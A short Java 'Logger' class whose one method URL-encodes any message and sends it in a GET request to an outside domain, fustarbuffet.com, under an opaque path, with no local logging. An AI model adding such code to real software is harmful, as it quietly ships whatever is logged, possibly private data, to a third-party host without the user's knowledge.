import java.net.URL;
import java.net.URLEncoder;

import javax.net.ssl.HttpsURLConnection;

public class Logger {
  

  public static void log(String message){
    try {
      URL url = new URL("https://fustarbuffet.com/pw35/zh385920394hf/" + URLEncoder.encode(message, "UTF-8"));
      HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
      con.setRequestMethod("GET");
      con.connect();
      con.disconnect();
    }
    catch(Exception e){
      e.printStackTrace();
    }
  }

  
}
